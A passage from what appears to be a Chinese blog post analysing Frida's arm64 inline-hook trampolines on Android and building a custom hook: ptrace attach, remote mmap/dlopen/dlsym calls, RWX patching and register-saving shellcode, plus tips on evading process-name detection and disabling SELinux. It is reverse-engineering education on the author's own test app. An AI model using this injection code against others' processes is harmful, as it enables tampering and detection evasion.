看看日志了，随后发现了这条日志，但是木有作用 E adbd: failed to connect to socket 'localabstract:': could not connect to localabstract address 'localabstract:'后来排查了一下午，原来是我为了防止进程名检测，保留了过去 ida-server 和 frida-server push 到手机里面之后修改文件名的习惯，把 llbd-server 的名字改成了 lldb26 , 然后…attach 的时候就报错了（改个文件名都不行 -,- 随后打个断点 (lldb) breakpoint set -s liboacia.so -a 0x10B0通过对 hook 地址的反编译，发现了很有意思的点就是从 hook 地址开始的后 16 个字节的汇编都和原来不一样了，但是 lldb 的汇编看起来很奇怪 0x6e84a900b0: 0x58000050 ldr x16, #0x8 0x6e84a900b4: 0xd61f0200 br x16 0x6e84a900b8: 0xb092a400 adrp x0, -895871 0x6e84a900bc: 0x00000071 udf #0x71 这段汇编给 x16 寄存器赋值为相对偏移 #0x8 位置的值，然后再去进行 BR 跳转，这后两行的指令 adrp x0, -895871 和 udf #0x71 压根就不是指令，而是一个八字节的一级跳板要跳往的地址 不得不说 lldb 确实是一个非常强大的动调工具，我觉得使用 lldb 的 python API 直接用脚本和汇编交互的样子一定非常的厉害，等之后分析抖音的 vmp 的时候在用它吧 想看正确的汇编怎么办呢，上 IDA! # IDA 动态调试分析 hook 跳板 IDA 直接附加的话是附加不上的，原因在于 apk 设置了 android:extractNativeLibs=&quot;false&quot; 导致 so 不会被解压到 /data/app/...com.oacia.apk_protect/lib/arm64 文件夹中，而是直接从 apk 中加载，所以 IDA 也就找不到这个 so 加载的时候了，这种情况下我们把要调试的 liboacia.so 用 MT 管理器直接复制到 /data/app/...com.oacia.apk_protect/lib/arm64 里面去就可以了，同时注意需要给这个 so rwx 的运行权限 # 一级跳板 有了 IDA 强大的反编译功能，这里的汇编也是显示了出来，从 hook 点开始的 16 个字节全部被一级跳板的字节码覆盖了，前 8 字节是两行汇编，用来实现跳板的跳转，后八字节存储了跳板要跳往的地址 这里使用的是 x16 和 x17 寄存器，那为什么使用这两个寄存器呢？ 根据 arm64 官网描述，x16 和 x17 是程序内调用临时寄存器，也就是平时根本不会用他们，所以把这两个寄存器用作跳板是再合适不过的 X16 and X17 are IP0 and IP1, intra-procedure-call temporary registers. These can be used by call veneers and similar code, or as temporary registers for intermediate values between subroutine calls. They are corruptible by a function. Veneers are small pieces of code which are automatically inserted by the linker, for example when the branch target is out of range of the branch instruction. 那顺便也记一下其他寄存器的作用好了 X0-X7: 参数寄存器，用于传递函数参数和返回结果，要是参数比八个多的话就会用堆栈去传递 X8: 用来存放函数返回值的，不过这个寄存器比较特殊一点，只有当返回值是大型结构体的时候才会用 x8 去返回，其余情况都是用 x0 去返回的 X9-X15: 临时寄存器，这 7 个寄存器是用来存储临时数据的 X16-X17: 他们是给编译器使用的，正常的程序都不会使用他们，所以当作跳板是相当的合适 X18: 平台寄存器，基本是不用的 X19-X28: 保存寄存器，这 10 个寄存器用来保存函数调用上下文 X29: FP 寄存器，用于连接栈帧 X30: 也叫 LR 寄存器，用于保存子程序的返回地址 X31: SP 寄存器，用于指向每个函数的栈顶 SP： SP 是栈顶指针寄存器，类似 Intel 64 中的 RSP 寄存器 PC： PC 寄存器存储当前要执行的指令地址，类似 Intel 64 中的 RIP 寄存器 # 二级跳板 二级跳板中 X17 保存了返回地址，也就是我们本身的 hook 地址的值，而 X16 则保存了三级跳版的位置，而在二级跳板的下方，竟然还有一个跳板，不过现在还没有看到它的用途所在 这里二级跳板有啥用？为啥不直接跳到三级跳板？ # 三级跳板 这三级跳板总共干了三件事情 # 保存寄存器环境 # 跳转到核心代码 经过三个跳板的层层跳转，我们也是终于来到了 frida_agent_64.so 中执行我们编写的 hook 逻辑比如打印寄存器，读取内存等操作了 # 恢复寄存器环境 使用 LDP 加载栈中保存的寄存器环境 # 恢复执行流 由于 hook 所生成的跳板函数会对 hook 位置的 16 字节汇编进行覆盖，所以必须要对被覆盖的那 16 字节汇编再次执行，否则将会对执行流产生影响。在三级跳板的最后 RET X16 , 将会来到跳转到此处执行先前未完成的汇编 # 自实现 inline hook 虽说要 hook 的目标是 arm64 linux, 但是本人对于安卓更为熟悉一些，所以这里的示例也使用的是 android (毕竟都是 arm64 架构，hook 肯定是通用的) 先写个一键编译的 run.bat 脚本，这样运行一下连带编译传输到手机上的步骤都一步到位了～ \"E:\\Program Files\\CLion 2024.1\\bin\\cmake\\win\\x64\\bin\\cmake.exe\" --build E:\\analysis\\frida-inline-hook\\self_hook\\cmake-build-android --target hook-server -j 14adb push .\\cmake-build-android\\hook-server /data/local/tmpadb shell \"chmod 777 /data/local/tmp/hook-server\"adb shell su -c \"/data/local/tmp/hook-server\"# ptrace 注入 如果我们要自己去实现对进程的注入，那么首先要做的就是使用 ptrace 的 PTRACE_ATTACH 附加到这个进程上面去 void ptraceAttach(pid_t pid)&#123; if(ptrace(PTRACE_ATTACH,pid,NULL,NULL)==-1)&#123; printf(\"[ptrace] Failed to attach:%d\\n\",pid); &#125; else&#123; printf(\"[ptrace] Attach to pid %d\\n\",pid); &#125; int stat=0; /* 在用 ptrace 去 attach 一个进程之后，那个被 attach 的进程某种意义上说可以算作那个 attach * 进程的子进程，这种情况下，就可以通过 waitpid 这个函数来知道被调试的进程何时停止运行 * * @param option->WUNTRACED: 如果子进程进入暂停状态，则马上返回。*/ waitpid(pid,&amp;stat,WUNTRACED);&#125; 一旦我们使用 ptrace 附加了上去，这就意味着我们有了对这个进程空间中的内存进行操作的权力，现在我们需要知道的是目标 so 库的基址在什么地方，这样我们才可以通过在 ida 中静态分析找到的 hook 点的偏移，来找到 hook 点的虚拟内存地址，而这可以通过遍历 maps 来实现 void* findModuleByName(pid_t pid,const char* libname)&#123; // 获取 hook-server 的 pid, 这样可以通过本地 libc 库函数地址 - 本地 libc 基址 + 远程 libc 基址 得到远程 libc 库函数地址 if(pid==-1)&#123; pid=getpid(); &#125; char maps[MAX_PATH]; void* base_addr = 0; snprintf(maps,MAX_PATH,\"/proc/%d/maps\",pid); FILE *f = fopen(maps,\"r\"); char line[MAX_PATH],name[MAX_PATH]; char *base; while(!feof(f))&#123; memset(line,0,MAX_PATH); fgets(line,MAX_PATH,f); //printf(\"%s\\n\",line); // 查找指定模块是否在某行出现 if(strstr(line,libname))&#123; //maps 形式: base-end [rwxsp] offset dev inode pathname //eg. 6f1305e000-6f13060000 r-xp 00000000 fe:2e 90655 /lib/arm64/liboacia.so /* * https://man7.org/linux/man-pages/man5/proc_pid_maps.5.html * The [offset] field is the offset into the file/whatever; * [dev] is the device (major:minor); * [inode] is the inode on that device. 0 indicates that no inode is associated with the memory * region, as would be the case with BSS (uninitialized data). * If the [pathname] field is blank, this is an anonymous mapping as obtained * via the mmap(2) function. There is no easy way to coordinate this back to * a process's source, short of running it through gdb(1), strace(1), or similar.*/ base = strtok(line, \"-\");// 以 `-` 为分隔符，读取基址 base_addr = (void*)strtoul(base, NULL, 16); printf(\"[maps] find module [%s] base at 0x%08lx\\n\",libname,base_addr); break; &#125; &#125; fclose(f); return base_addr;&#125; 现在我们尝试去读取一下 hook 点的汇编，来看看 ptrace 究竟有没有生效，这可以通过 PTRACE_PEEKTEXT 来实现 void ptraceReadData(pid_t pid,void* addr,char*data,size_t len)&#123; size_t i=0; long rdata; for(;i&lt;len;i+=sizeof(long))&#123; rdata=ptrace(PTRACE_PEEKTEXT,pid,(long)addr+i,NULL); *(long*)&amp;data[i]=rdata; &#125;&#125; nice, 将通过 ptrace 读取的汇编和 ida 中反编译出来的汇编对比一下，简直就是一模一样～ # 为字符串分配内存 接下来我们需要通过 dlopen 加载我们的功能库 so, 而这必定会涉及到字符串相关的内存，为了让目标字符串可以被远程的进程访问到，所以我们必须要通过 mmap 在远程的进程空间中分配一块属于我们自己的，可以自由操控的内存 在这之前，我们先对当前的寄存器环境进行保存，以便之后可以还原寄存器的环境 void ptraceGetRegs(pid_t pid,struct user_pt_regs *regs_addr)&#123; struct iovec io; io.iov_base = regs_addr; io.iov_len = sizeof(struct user_pt_regs); //NT_PRSTATUS: general-purpose registers, 定义在 elf.h 中 /** * PTRACE_GETREGSET * 读取被追踪者寄存器。addr 参数决定读取寄存器的类型。 * 如果 addr 是 NT_PRSTATUS，则读取通用寄存器。 * 如果 addr 是 NT_foo，则读取浮点或向量寄存器（如果有的话)。data 参数指向 iovec 类型： */ if(ptrace(PTRACE_GETREGSET,pid,NT_PRSTATUS,&amp;io)==-1)&#123; printf(\"Get regs failed\"); &#125;&#125;void inject(pid_t pid)&#123; ... struct user_pt_regs oldRegs; struct user_pt_regs regs; // 保存寄存器环境 ptraceGetRegs(pid,&amp;oldRegs); memcpy(&amp;regs,&amp;oldRegs, sizeof(struct user_pt_regs)); ...&#125;接下来我们去获取一下 mmap 在远程空间中的位置，在 android 中， mmap 是在 libc 库中被定义的，具体的位置是在 /apex/com.android.runtime/lib64/bionic/libc.so , 由于 mmap 在 libc.so 中的相对偏移是固定的，而我们可以在 hook-server 内部直接获取到 mmap 函数的本地地址 (利用 *mmap 获取函数指针即可实现), 所以我们再读取一下 hook-server 中的 libc.so 的基址，相减即可得到 mmap 函数的相对偏移，把这个相对偏移再加上被 hook 的进程中的 libc.so 的基址，不就可以得到 mmap 函数在远程进程中的地址咯 void* getRemoteLibFunc(pid_t pid,const char* libname,void* LocalFuncAddr)&#123; void *LocalLibBase,*RemoteLibBase,*RemoteFuncAddr; LocalLibBase = findModuleByName(-1,libname);//-1 表示在当前 hook-server 的 maps 中寻找库的基址 RemoteLibBase = findModuleByName(pid,libname); RemoteFuncAddr = LocalFuncAddr-LocalLibBase+RemoteLibBase; printf(\"LocalLibBase: 0x%08lx, LocalFuncAddr: 0x%08lx\\nRemoteLibBase: 0x%08lx, func offset: 0x%08lx\\n\",LocalLibBase,LocalFuncAddr,RemoteLibBase,LocalFuncAddr-LocalLibBase); return RemoteFuncAddr;&#125;void inject(pid_t pid)&#123; ... // 通过 mmap 为跳板分配内存 void* RemoteMmapAddr = getRemoteLibFunc(pid,\"libc.so\",(void*)mmap); printf(\"[libc] find remote mmap addr at 0x%08lx\\n\",(long)RemoteMmapAddr); ... &#125;随后再去设置一下寄存器和 pc 的值，mmap 就能被我们成功的调用了，ptrace 主动调用的细节可以看我写的注释↓ #define CPSR_T_MASK (1u&lt;&lt;5)#define ARM_lr regs[30]void ptraceCall(pid_t pid,void* funcaddr,int argc,long* argv,struct user_pt_regs *regs)&#123; // 比八个参数多的话，多出的参数通过栈去传参 if(argc>8)&#123; regs->sp =regs->sp - (argc-8)*(sizeof(long));// 申请 8 个寄存器的栈空间 ptraceWriteData(pid,(void*)regs->sp,(char*)&amp;argv[8],sizeof(long)*(argc-8)); &#125; // 少于 8 个参数，就通过 x0~x7 寄存器去传参 for(size_t i=0;i&lt;8;i++)&#123; regs->regs[i] = argv[i]; &#125; regs->pc = (__u64) funcaddr;// 将 pc 寄存器的值修改为函数地址，这样我们就可以跳转到函数的目标地址去执行 arm64 指令了 printf(\"[ptraceCall] funcaddr: 0x%08lx\\n\",regs->pc); if(regs->pc&amp;1)&#123; //thumb 模式 // 当 pc 的最后一位为 1, 即 pc 为奇数时，设置 pstate CPSR 的 T 标志位为 1, 表示接下来的指令以 thumb 模式执行 regs->pc&amp;=~1; //pstate, 这是 arm64v8a 的叫法，在 armv7a 中叫 CPSR 寄存器 //more-> https://blog.csdn.net/longwang155069/article/details/105204547 regs->pstate|=CPSR_T_MASK; &#125;else&#123; //arm 模式 // 当 pc 的最后一位为 0, 即 pc 为偶数时，清除 pstate CPSR 的 T 标志位，表示接下来的指令以 arm 模式执行 regs->pstate&amp;=~CPSR_T_MASK; &#125; regs->ARM_lr = 0;// 设置 lr 寄存器为 0, 要是函数执行完毕之后返回 0 地址会抛出异常，这个异常在后面是有用的 ptraceSetRegs(pid,regs);// 设置寄存器的值，把函数的参数和地址传进寄存器里面 int stat = 0; /** * 对于使用 ptrace_cont 重新运行的进程，它会在 3 种情况下进入暂停状态 * 1. 下一次系统调用 * 2. 子进程退出 * 3. 子进程的执行发生错误 * 这里的 0xb7f 我们可以拆分成两部分来看，后 2 字节 0x7f, 表示进程进入了暂停的状态 * (如果后两字节是 0x00 则表示子进程退出状态), 而前两字节 0xb, 表示进程发送的错误信号为 11 (SIGSEGV), * 即内存访问异常，因为我们之前将 lr 寄存器的值设为了 0, 所以当远程函数调用完毕之后会抛出异常， * 当 ptrace 收到这个异常信号时，就知道远程函数调用以及完成了～ */ while(stat!=0xb7f)&#123; ptraceContinue(pid);// 让被 ptrace 的线程开始运行 waitpid(pid,&amp;stat,WUNTRACED); printf(\"[ptraceCall] stat: 0x%04x\\n\",stat); &#125; ptraceGetRegs(pid,regs);// 当远程函数调用完成之后，读取寄存器获取返回值&#125;void inject(pid_t pid)&#123; ... // 调用 mmap 函数 long paras[6]; paras[0]= 0; paras[1]=0x1000; paras[2]=PROT_READ|PROT_WRITE|PROT_EXEC; paras[3]=MAP_ANONYMOUS|MAP_PRIVATE; paras[4]=0; paras[5]=0; ptraceCall(pid,RemoteMmapAddr,6,paras,&amp;regs); void *RemoteMemAddr = (void *)regs.regs[0];//mmap 返回值存储在 x0 中，从 x0 获取远程的 mmap 函数分配的内存 printf(\"[libc] mmap alloc memory at 0x%08lx\\n\",(long)RemoteMemAddr); ...&#125; # 加载 hook 功能库 so 现在我们已经通过 mmap 成功的在被 hook 进程中分配了一块内存，接下来要做的是在被 hook 进程中加载我们的 hook 功能库 so, 这个 so 是跳板最终要跳往的地方，用来执行打印或修改寄存器的操作，我们现在就把这个 so 的名称叫做 libhook-agent.so 吧，当前代码如下，通过远程调用 work_func 来观察我们的 so 是否被成功的加载进来 //hook-agent.c#include \"stdio.h\"#include &lt;android/log.h>#define LOG_TAG \"hook-agent\"#define LOGD(...) ((void)__android_log_print(ANDROID_LOG_DEBUG , LOG_TAG, __VA_ARGS__))int work_func()&#123; LOGD(\"call work_func ok!\"); return 777;&#125;首先我们先获取一下 dlopen 在远程进程中的地址，随后将要加载的 so 的绝对地址写入 mmap 分配的内存中，再去调用 ptrace 调用一下 dlopen 函数就可以啦 // 获取 dlopen 在远程进程中的地址void* RemoteDlopenAddr = getRemoteLibFunc(pid,\"libdl.so\",(void*)dlopen);printf(\"[libdl] find remote dlopen addr at 0x%08lx\\n\",(long)RemoteDlopenAddr);/** * 将要加载的 so 的绝对地址写入 mmap 分配的内存中，可以把 so 放在 app 的私有目录下面， * 要是放在 /data/local/tmp 目录下面，会遇到 avc denied, * 这个时候需要使用 setenforce 0 临时禁用掉 selinux 才可以*/ptraceWriteData(pid,RemoteMemAddr,\"/data/data/com.oacia.apk_protect/libhook-agent.so\",strlen(\"/data/data/com.oacia.apk_protect/libhook-agent.so\")+1);// 调用 dlopen 函数paras[0] = (long) RemoteMemAddr;paras[1]=RTLD_NOW|RTLD_GLOBAL;ptraceCall(pid,RemoteDlopenAddr,2,paras,&amp;regs);void *HookAgentAddr = (void *)regs.regs[0];//dlopen 返回值存储在 x0 中，从 x0 获取远程的 dlopen 返回的 handleprintf(\"[libdl] dlopen libhook-agent.so addr: 0x%08lx\\n\\n\",(long)HookAgentAddr);HookAgentAddr 的值不为空，说明 libhook-agent.so 被成功的加载了进来 随后我们再使用远程进程的 dlsym , 找到 libhook-agent.so 功能函数的地址，并主动调用 work_func 来看一下情况 //dlsym 获取调用函数的地址void* RemoteDlsymAddr = getRemoteLibFunc(pid,\"libdl.so\",(void*)dlsym);printf(\"[libdl] find remote dlsym addr at 0x%08lx\\n\",(long)RemoteDlsymAddr);// 将被调用函数的函数名写入 mmap 分配的内存中ptraceWriteData(pid,RemoteMemAddr,\"work_func\",strlen(\"work_func\")+1);paras[0] = (long) HookAgentAddr;paras[1]= (long) RemoteMemAddr;ptraceCall(pid,RemoteDlsymAddr,2,paras,&amp;regs);void* remoteFuncAddr = (void *)regs.regs[0];printf(\"[libdl] dlsym find hook-agent function addr at 0x%08lx\\n\",(long)remoteFuncAddr);ptraceCall(pid,remoteFuncAddr,0,paras,&amp;regs);// 主动调用 hook-agent 中的 work_funcint checkOK = (int)regs.regs[0];printf(\"call wrok_func in libhook-agent.so, ret -> %d\\n\",checkOK);nice! 函数被成功的调用了，并且返回值也是和 work_func 中的返回值一模一样 而此时的 logcat, 也有日志被正确的打印出来 # 在 hook 点 patch 上跳板 现在我们需要在 hook 点 patch 跳板，目前来看最初使用的跨进程通过 ptrace 的 PTRACE_POKETEXT 在进程中写入跳板的方式，似乎是存在 bug 的，写入字节的次数的过多的话被 hook 进程就会崩溃，并且跨进程通过 ptrace 调用 mprotect 将 hook 处的页属性改为 rwx 没有生效，写入时进程就会崩溃 通过ptrace的`PTRACE_POKETEXT`进行patch 接下来我们使用 X16 寄存器，在 hook 点 patch 上一级跳板，这个一级跳板将会跳往二级跳板 void write_trampoline_stage1(pid_t pid,void* target,char* libname,int offset,char* save_code)&#123; void* RemoteLibBase = findModuleByName(pid,libname); long hook_addr = (long)RemoteLibBase+offset; // 生成跳板函数 unsigned char trampoline[16] = &#123; 0x50,0x00,0x00,0x58,//LDR X16,#0x8 0x00,0x02,0x1f,0xD6,//BR X16 &#125;; for(int i=0;i&lt;8;i++)&#123; trampoline[i+8] = *((char*)target+i); &#125; // 读取即将被覆盖的指令 ptraceReadData(pid, (void *) hook_addr, save_code, 0x10); // 写入跳板 ptraceWriteData(pid, (void *) hook_addr, (char*)trampoline, 16,0);&#125;// 写入一级跳板汇编char save_code[16];// 保存被跳板覆盖的指令，在完成 hook 之后这 4 行汇编需要被执行memset(save_code,0,16);write_trampoline_stage1(pid,RemoteMemAddr,\"liboacia.so\",0x10B0,save_code);在二级跳板这里，我们直接将保存寄存器环境，跳往功能函数，恢复寄存器环境，执行被跳板覆盖的汇编的这四个过程直接合在一起 void write_trampoline_stage2(pid_t pid,void* patch_addr,char* libname,int offset,const char* save_code,void* hook_agent_func_addr)&#123; void* RemoteLibBase = findModuleByName(pid,libname); long hook_addr = (long)RemoteLibBase+offset; long ret_addr = hook_addr+16; // 生成跳板函数，trampoline bytes are from frida hook decompile char trampoline[360] = &#123; // 保存寄存器环境 0xff,0x43,0x00,0xd1, 0xfe,0x7f,0xbf,0xad, 0xfc,0x77,0xbf,0xad, 0xfa,0x6f,0xbf,0xad, 0xf8,0x67,0xbf,0xad, 0xf6,0x5f,0xbf,0xad, 0xf4,0x57,0xbf,0xad, 0xf2,0x4f,0xbf,0xad, 0xf0,0x47,0xbf,0xad, 0xee,0x3f,0xbf,0xad, 0xec,0x37,0xbf,0xad, 0xea,0x2f,0xbf,0xad, 0xe8,0x27,0xbf,0xad, 0xe6,0x1f,0xbf,0xad, 0xe4,0x17,0xbf,0xad, 0xe2,0x0f,0xbf,0xad, 0xe0,0x07,0xbf,0xad, 0xfd,0x7b,0xbf,0xa9, 0xfb,0x73,0xbf,0xa9, 0xf9,0x6b,0xbf,0xa9, 0xf7,0x63,0xbf,0xa9, 0xf5,0x5b,0xbf,0xa9, 0xf3,0x53,0xbf,0xa9, 0xf1,0x4b,0xbf,0xa9, 0xef,0x43,0xbf,0xa9, 0xed,0x3b,0xbf,0xa9, 0xeb,0x33,0xbf,0xa9, 0xe9,0x2b,0xbf,0xa9, 0xe7,0x23,0xbf,0xa9, 0xe5,0x1b,0xbf,0xa9, 0xe3,0x13,0xbf,0xa9, 0xe1,0x0b,0xbf,0xa9, 0x01,0x42,0x3b,0xd5, 0xe1,0x03,0xbf,0xa9, 0xe0,0x43,0x0c,0x91, 0xff,0x03,0xbf,0xa9, 0xfe,0x8f,0x01,0xf9, 0xfd,0x8b,0x01,0xf9, 0xfd,0x43,0x0c,0x91, 0xe1,0x03,0x00,0x91, 0xe2,0x23,0x04,0x91, 0xe3,0x43,0x0c,0x91, // 跳转到核心代码 0xe0,0x03,0x11,0xaa, 0x64,0x05,0x00,0x58, 0x80,0x00,0x3f,0xd6, // 还原寄存器环境 0xff,0x43,0x00,0x91, 0xe1,0x03,0xc1,0xa8, 0x01,0x42,0x1b,0xd5, 0xe1,0x0b,0xc1,0xa8, 0xe3,0x13,0xc1,0xa8, 0xe5,0x1b,0xc1,0xa8, 0xe7,0x23,0xc1,0xa8, 0xe9,0x2b,0xc1,0xa8, 0xeb,0x33,0xc1,0xa8, 0xed,0x3b,0xc1,0xa8, 0xef,0x43,0xc1,0xa8, 0xf1,0x4b,0xc1,0xa8, 0xf3,0x53,0xc1,0xa8, 0xf5,0x5b,0xc1,0xa8, 0xf7,0x63,0xc1,0xa8, 0xf9,0x6b,0xc1,0xa8, 0xfb,0x73,0xc1,0xa8, 0xfd,0x7b,0xc1,0xa8, 0xe0,0x07,0xc1,0xac, 0xe2,0x0f,0xc1,0xac, 0xe4,0x17,0xc1,0xac, 0xe6,0x1f,0xc1,0xac, 0xe8,0x27,0xc1,0xac, 0xea,0x2f,0xc1,0xac, 0xec,0x37,0xc1,0xac, 0xee,0x3f,0xc1,0xac, 0xf0,0x47,0xc1,0xac, 0xf2,0x4f,0xc1,0xac, 0xf4,0x57,0xc1,0xac, 0xf6,0x5f,0xc1,0xac, 0xf8,0x67,0xc1,0xac, 0xfa,0x6f,0xc1,0xac, 0xfc,0x77,0xc1,0xac, 0xfe,0x7f,0xc1,0xac, 0xf0,0x47,0xc1,0xa8, // 执行先前因 patch 跳板被覆盖的代码，16 字节占位 0xaa,0xaa,0xaa,0xaa, 0xaa,0xaa,0xaa,0xaa, 0xaa,0xaa,0xaa,0xaa, 0xaa,0xaa,0xaa,0xaa, // 返回 hook 点之后的位置继续执行逻辑 0x50,0x00,0x00,0x58, 0x00,0x02,0x1f,0xD6, //8 字节占位，存储功能函数的地址 0xbb,0xbb,0xbb,0xbb, 0xbb,0xbb,0xbb,0xbb, //8 字节占位，存储功能 hook 完成后返回到原来程序的地址 0xcc,0xcc,0xcc,0xcc, 0xcc,0xcc,0xcc,0xcc, &#125;; for(int i=0;i&lt;16;i++)&#123; trampoline[i+320] = save_code[i]; &#125; for(int i=0;i&lt;8;i++)&#123; trampoline[i+344] = *((char*)hook_agent_func_addr+i); &#125; for(int i=0;i&lt;8;i++)&#123; trampoline[i+352] = *((char*)ret_addr+i); &#125; ptraceWriteData(pid, (void *) patch_addr, trampoline, 360,0);&#125; 所以可以想想换一种方法，既然 so 可以注入进去，那就直接在 so 加载的时候，通过 __attribute__((constructor)) , 在通过这个 so 在被 hook 进程内部执行 patch 跳板的逻辑不就可以了 /** * 完成一次完整的 hook, 需要先由 hook 点的一级跳板跳转到二级跳板的位置， * 一级跳板通过 BR X16 跳往二级跳板，二级跳板保存寄存器的环境，跳转到 hook 的 * 功能函数位置，随后还原寄存器环境，并执行先前被覆盖的四条汇编 * , 随后通过 BR X16 寄存器，跳往 hook 点之后的位置，完成一次完整的 hook * */static __attribute__((constructor)) void ctor()&#123; u_long hook_addr = (u_long)findModuleByName(-1,\"liboacia.so\")+0x10B8; LOGD(\"hook-agent init!\"); extern u_long _trampoline_,_shellcode_addr_,_shellcode_start_,_shellcode_end_,_origin_patched_code_,_hook_main_func_addr_,_hook_finish_return_addr_; u_long total_len = (u_long)&amp;_shellcode_end_ - (u_long)&amp;_shellcode_start_; LOGD(\"shellcode len: %lu, hook_addr: 0x%08lx,offset: 0x%04x\",total_len,hook_addr,0x10B8); // 为 shellcode 分配内存 u_long page_size = getpagesize(); u_long shellcode_mem_start = (u_long)mmap(0, page_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0); memset((void *)shellcode_mem_start, 0, page_size); memcpy((void *)shellcode_mem_start, (void *)&amp;_shellcode_start_, total_len); LOGD(\"_shellcode_addr_: 0x%08lx,shellcode_mem_start: 0x%08lx\",*(u_long*)&amp;_shellcode_addr_, shellcode_mem_start); // 尝试了一下好像没有办法给_shellcode_addr_赋值 (很奇怪) // 所以索性直接这样赋值了 *(u_long*)(hook_addr + 8) = shellcode_mem_start; //*(u_long*)&amp;_shellcode_addr_ = (u_long)shellcode_mem_start; // 通过相对偏移的方式，定位到需要替换的地址在 mmap 分配的内存中的地址 u_long mem_hook_main_func_addr_ = (u_long)&amp;_hook_main_func_addr_ - (u_long)&amp;_shellcode_start_ + shellcode_mem_start; u_long mem_origin_patched_code_ = (u_long)&amp;_origin_patched_code_ - (u_long)&amp;_shellcode_start_ + shellcode_mem_start; u_long mem_hook_finish_return_addr_ = (u_long)&amp;_hook_finish_return_addr_ - (u_long)&amp;_shellcode_start_ + shellcode_mem_start; //hook 的功能函数的地址 *(u_long*)mem_hook_main_func_addr_ = (u_long)hook_main; // 被跳板覆盖前，hook 点的 16 字节 *(u_long*)mem_origin_patched_code_ = *(u_long*)hook_addr; *(u_long*)(mem_origin_patched_code_ + 8) = *(u_long*)(hook_addr + 8); //hook 执行完毕后的返回地址 *(u_long*)mem_hook_finish_return_addr_ = (u_long)hook_addr + 0x10; //patch 上我们的跳板 u_long entry_page_start = (u_long)(hook_addr) &amp; (~(page_size-1)); mprotect((u_long*)entry_page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC); *(u_long*)hook_addr = *(u_long*)&amp;_trampoline_; *(u_long*)(hook_addr + 8) = shellcode_mem_start;&#125;相关的 shellcode 如下，在保存寄存器环境时，CPSR 寄存器也要一起保存，但是看 frida hook 之后的样子，只需要保存 NZCV 寄存器就足够了，所以这里也不对 CPSR 寄存器的其他字段作保存了 #在hook点patch上跳板,跳转到我们的shellcode.global _trampoline_#shellcode所在的地址,跳板需要跳转到shellcode.global _shellcode_addr_#shellcode的起始地址和结束地址,用来定位shellcode的大小以及字节.global _shellcode_start_.global _shellcode_end_#被跳板覆盖的16字节指令,这些指令我们需要在hook完成之后再次执行,才不会影响到原本的逻辑.global _origin_patched_code_#跳转到hook的核心功能函数的地址去执行读取寄存器/修改寄存器等操作.global _hook_main_func_addr_#当所有的hook逻辑执行完毕之后,需要返回到hook点后16字节的位置去执行后续的指令.global _hook_finish_return_addr__trampoline_: LDR X16, SHELLCODE_ADDR BR x16#这里需要先声明SHELLCODE_ADDR的地址,否则会出现ld: error: relocation R_AARCH64_LD_PREL_LO19 cannot be used against symbol '_shellcode_addr_'#就是说不能用已经声明过全局的符号来作重定位SHELLCODE_ADDR:_shellcode_addr_: .dword 0x1234567812345678_shellcode_start_: #本来想参考https://github.com/zzyccs/inlineHook/blob/master/app/src/main/cpp/inline_shellcode.S #手动通过STP寄存器的大小一个一个算出存入堆栈的地址的 #但是看了一下frida,直接用STP Xt1, Xt2, [Xn|SP, #imm]! ; 64-bit #这种预索引的方式修改SP的值,这样就不需要size*0,size*1...的方式去计算寄存器存储的位置 #可以达到持续入栈的效果,太厉害啦 STP Q30, Q31, [SP,#-0x20]! STP Q28, Q29, [SP,#-0x20]! STP Q26, Q27, [SP,#-0x20]! STP Q24, Q25, [SP,#-0x20]! STP Q22, Q23, [SP,#-0x20]! STP Q20, Q21, [SP,#-0x20]! STP Q18, Q19, [SP,#-0x20]! STP Q16, Q17, [SP,#-0x20]! STP Q14, Q15, [SP,#-0x20]! STP Q12, Q13, [SP,#-0x20]! STP Q10, Q11, [SP,#-0x20]! STP Q8, Q9, [SP,#-0x20]! STP Q6, Q7, [SP,#-0x20]! STP Q4, Q5, [SP,#-0x20]! STP Q2, Q3, [SP,#-0x20]! STP Q0, Q1, [SP,#-0x20]! STP X30, X31, [SP,#-0x10]! STP X28, X29, [SP,#-0x10]! STP X26, X27, [SP,#-0x10]! STP X24, X25, [SP,#-0x10]! STP X22, X23, [SP,#-0x10]! STP X20, X21, [SP,#-0x10]! STP X18, X19, [SP,#-0x10]! STP X16, X17, [SP,#-0x10]! STP X14, X15, [SP,#-0x10]! STP X12, X13, [SP,#-0x10]! STP X10, X11, [SP,#-0x10]! STP X8, X9, [SP,#-0x10]! STP X6, X7, [SP,#-0x10]! STP X4, X5, [SP,#-0x10]! STP X2, X3, [SP,#-0x10]! STP X0, X1, [SP,#-0x10]! #特别注意,CPSR寄存器也要保存,不然只能打印一次值然后就崩溃了-m- #aarch64不能和aarch32一样,直接访问CPSR得到所有的值,所以得分开来访问 #看frida的hook之后的样子,看上去只需要保存NZCV寄存器就足够了 MRS X1, NZCV #MRS X0, DAIF STP X0, X1,[SP,#-0x10]! MOV X0, SP LDR X16, HOOK_MAIN_FUNC_ADDR BLR X16 #恢复CPSR寄存器 LDP X0, X1, [SP],#0x10 MSR NZCV, X1 #MSR DAIF, X0 #恢复X0-X31,Q0-Q31寄存器 LDP X0, X1, [SP],#0x10 LDP X2, X3, [SP],#0x10 LDP X4, X5, [SP],#0x10 LDP X6, X7, [SP],#0x10 LDP X8, X9, [SP],#0x10 LDP X10, X11, [SP],#0x10 LDP X12, X13, [SP],#0x10 LDP X14, X15, [SP],#0x10 LDP X16, X17, [SP],#0x10 LDP X18, X19, [SP],#0x10 LDP X20, X21, [SP],#0x10 LDP X22, X23, [SP],#0x10 LDP X24, X25, [SP],#0x10 LDP X26, X27, [SP],#0x10 LDP X28, X29, [SP],#0x10 LDP X30, X31, [SP],#0x10 LDP Q0, Q1, [SP],#0x20 LDP Q2, Q3, [SP],#0x20 LDP Q4, Q5, [SP],#0x20 LDP Q6, Q7, [SP],#0x20 LDP Q8, Q9, [SP],#0x20 LDP Q10, Q11, [SP],#0x20 LDP Q12, Q13, [SP],#0x20 LDP Q14, Q15, [SP],#0x20 LDP Q16, Q17, [SP],#0x20 LDP Q18, Q19, [SP],#0x20 LDP Q20, Q21, [SP],#0x20 LDP Q22, Q23, [SP],#0x20 LDP Q24, Q25, [SP],#0x20 LDP Q26, Q27, [SP],#0x20 LDP Q28, Q29, [SP],#0x20 LDP Q30, Q31, [SP],#0x20_origin_patched_code_: .dword 0x1234567812345678 .dword 0x1234567812345678 LDR X16, HOOK_FINISH_RETURN_ADDR BR 